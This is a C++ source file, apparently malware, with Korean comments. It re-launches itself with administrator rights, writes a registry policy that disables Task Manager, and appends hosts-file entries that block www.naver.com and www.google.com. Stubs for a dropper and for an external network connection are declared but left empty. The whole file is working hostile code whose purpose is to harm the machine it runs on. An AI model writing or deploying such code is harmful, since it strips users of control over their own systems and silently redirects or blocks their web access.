#include "MalwareManager.h"
#include <tchar.h>
#include <Windows.h>
#include <fstream>
#include <iostream>

MalwareManager::MalwareManager()
{

}

MalwareManager::~MalwareManager()
{
}

// 관리자 권한이 아닌 경우, 권한 요청
void MalwareManager::ElevateApplication()
{
	if (!IsAppRunningAsAdminMode())
	{
		ElevateToAdmin();
	}
}

//레벨에 따른 동작 설정
void MalwareManager::Action(int level)
{
	ChangeRegistry();
	ChangeHostFile();
}

// 관리자 권한으로 실행 요구
void MalwareManager::ElevateToAdmin()
{
	wchar_t szPath[MAX_PATH];
	if (GetModuleFileName(NULL, szPath, ARRAYSIZE(szPath)))
	{
		SHELLEXECUTEINFO sei = { sizeof(sei) };
		sei.lpVerb = L"runas";
		sei.lpFile = szPath;
		sei.hwnd = NULL;
		sei.nShow = SW_NORMAL;
		if (!ShellExecuteEx(&sei))
		{
			DWORD dwError = GetLastError();
			if (dwError == ERROR_CANCELLED)
			{
				std::cout << "User did not allow elevation" << std::endl;
			}
		}
		else
		{
			_exit(1);
		}
	}
}

// 실행 권한이 관리자인지 확인
bool MalwareManager::IsAppRunningAsAdminMode()
{
	BOOL fIsRunAsAdmin = FALSE;
	DWORD dwError = ERROR_SUCCESS;
	PSID pAdministratorsGroup = NULL;

	SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
	if (!AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pAdministratorsGroup))
	{
		dwError = GetLastError();
		goto Cleanup;
	}

	if (!CheckTokenMembership(NULL, pAdministratorsGroup, &fIsRunAsAdmin))
	{
		dwError = GetLastError();
		goto Cleanup;
	}

Cleanup:
	if (pAdministratorsGroup)
	{
		FreeSid(pAdministratorsGroup);
		pAdministratorsGroup = NULL;
	}

	if (dwError != ERROR_SUCCESS)
	{
		throw dwError;
	}
	return fIsRunAsAdmin;
}

// 작업 관리자 비활성화 레지스트리 등록
void MalwareManager::ChangeRegistry()
{
	HKEY hKeySystem;
	if (RegCreateKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
		0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKeySystem, NULL) == ERROR_SUCCESS)
	{
		DWORD dwData = 1;
		if (RegSetValueEx(hKeySystem, L"DisableTaskMgr", 0, REG_DWORD, (PBYTE)&dwData, sizeof(dwData)) == ERROR_SUCCESS)
		{
			std::cout << "Success Disable Taskmgr" << std::endl;
		}
	}

	RegCloseKey(hKeySystem);
}

void MalwareManager::ChangeHostFile()
{
	WCHAR wszWinDir[MAX_PATH];
	if (GetSystemDirectory(wszWinDir, MAX_PATH) > 0)
	{
		wcscat_s(wszWinDir, MAX_PATH, L"\\drivers\\etc\\hosts");
		std::wofstream ofsHostFile(wszWinDir, std::ios::app | std::ios::binary);
		ofsHostFile << "127.0.0.1 www.naver.com" << std::endl << "127.0.0.1 www.google.com" << std::endl;
		ofsHostFile.close();
	}
}

void MalwareManager::DropperAction()
{

}

void MalwareManager::ConnectExternalNetwork()
{

}